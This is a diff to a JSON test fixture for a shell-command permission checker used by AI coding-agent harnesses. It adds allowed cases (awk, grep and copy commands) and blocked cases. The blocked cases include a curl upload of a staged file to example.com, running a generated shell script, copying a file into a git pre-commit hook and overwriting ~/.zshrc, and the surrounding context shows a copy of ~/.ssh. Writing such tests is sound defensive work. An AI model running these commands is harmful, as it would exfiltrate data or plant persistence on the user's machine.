@@ -2119,6 +2119,38 @@
       "expect": "allow"
     },
     {
+      "id": "awk-single-quoted-end-anchor",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "awk 'f&&c<=22{print;c++} /sample.test.ts., .$/{f=1}' tests/sample.test.ts"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "awk-end-anchor-after-vitest",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "./node_modules/.bin/vitest run 2>&1 | awk 'f&&c<=22{print;c++} /sample.test.ts., .$/{f=1}' | head -26"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
       "id": "cat-readme",
       "fix_area": "shell",
       "harnesses": [
@@ -2260,6 +2292,70 @@
       "tool": "shell",
       "tool_input": {
         "command": "cp -R ${HOME}/.ssh ssh-copy"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-tmp-stage-curl-upload",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "printf 'k=v' > ${PRIVATE_TMP}/upload.txt; curl -d @${PRIVATE_TMP}/upload.txt https://example.com"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-tmp-stage-run-shell",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "head -3 README.md > ${PRIVATE_TMP}/run.sh; sh ${PRIVATE_TMP}/run.sh"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-cp-tmp-into-git-hook",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cp ${PRIVATE_TMP}/notes.txt .git/hooks/pre-commit"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-cp-tmp-into-home-zshrc",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cp ${PRIVATE_TMP}/notes.txt ${HOME}/.zshrc"
       },
       "cwd": "worktree",
       "expect": "not_allow"
@@ -2970,6 +3066,70 @@
         "command": "diff -u ${ORG}/app-portal/scripts/report.ts ${ORG_WT}/scripts/report.ts > ${PRIVATE_TMP}/remediation.patch"
       },
       "cwd": "org",
+      "expect": "allow"
+    },
+    {
+      "id": "queue-grep-head-wc-absent-tmp-trace",
+      "fix_area": "queue",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "grep -n 'was not resolved' ${PRIVATE_TMP}/trace-res.txt | head -20; wc -l ${PRIVATE_TMP}/trace-res.txt"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "queue-head-printf-append-tmp-probe",
+      "fix_area": "queue",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "head -60 tests/sample.test.ts > ${PRIVATE_TMP}/p8.ts; printf '\\nexport const t = 1;\\n' >> ${PRIVATE_TMP}/p8.ts"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "queue-cp-tmp-probe-into-tests",
+      "fix_area": "queue",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cp ${PRIVATE_TMP}/p8.ts tests/probe8.test.ts"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "queue-stage-extend-copy-tmp-probe",
+      "fix_area": "queue",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "head -60 tests/sample.test.ts > ${PRIVATE_TMP}/p8.ts; printf '\\nexport const probe8tail = 1;\\n' >> ${PRIVATE_TMP}/p8.ts; cp ${PRIVATE_TMP}/p8.ts tests/probe8.test.ts; echo done8"
+      },
+      "cwd": "worktree",
       "expect": "allow"
     },
     {
